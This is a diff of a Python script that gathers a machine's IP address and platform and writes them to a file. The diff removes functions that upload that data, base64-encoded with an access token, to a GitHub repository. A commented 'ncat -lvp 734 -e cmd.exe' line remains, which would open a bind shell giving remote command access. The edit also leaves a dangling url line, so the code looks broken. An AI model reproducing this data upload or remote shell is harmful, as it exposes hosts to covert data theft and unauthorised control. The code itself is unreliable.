@@ -13,47 +13,9 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
-
-
-def update_file_on_github(file_path,token):
     url = f"https://api.github.com/repos/kaki714/Not/contents/data/data.txt"
-    with open(file_path, "rb") as f:      
-	# Encoding "my-local-image.jpg" to base64 format      
-	encodedData = base64.b64encode(f.read())      
-	headers = {          
-		"Authorization": f'''Bearer {token}''',
-	        "Content-type": "application/vnd.github+json"
-		 } 
-	data = {
-           "message": "se ha subido una imagen", 
-	# Put your commit message here.          
-	   "content": encodedData.decode("utf-8")
-	     }      
-	r = requests.put(url, headers=headers, json=data)      
- 	print(r.text) # Printing the response
-
-
-def subir_archivo( nombre_archivo, contenido_archivo):
-    url = f"https://api.github.com/repos/kaki714/Not/contents/{nombre_archivo}"
-   
-    headers = {
-        "Authorization": f"{token}",
-        "Content-Type": "application/json"
-    }
-    contenido_base64 = base64.b64encode(contenido_archivo.encode())
-    data = {
-        "message": "Agregar archivo",
-        "content": contenido_base64
-    }
-    response = requests.post(url, json=data, headers=headers)
-    if response.status_code == 201:
-        print("Archivo subido exitosamente")
-    else:
-        print(f"Error al subir el archivo: {response.json()['message']}")
-
-def fillFile(file_path, string_to_write):
-    with open(file_path, "w") as file:
-        file.write(string_to_write)
+  
+  
         
 
 def run(token):
@@ -84,8 +46,7 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
         print("text stmnt: "+ stmnt)
         create_file(fname,stmnt)
-        subir_archivo(fname, stmnt )
-        #update_file_on_github(fname,token)
+        
         delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
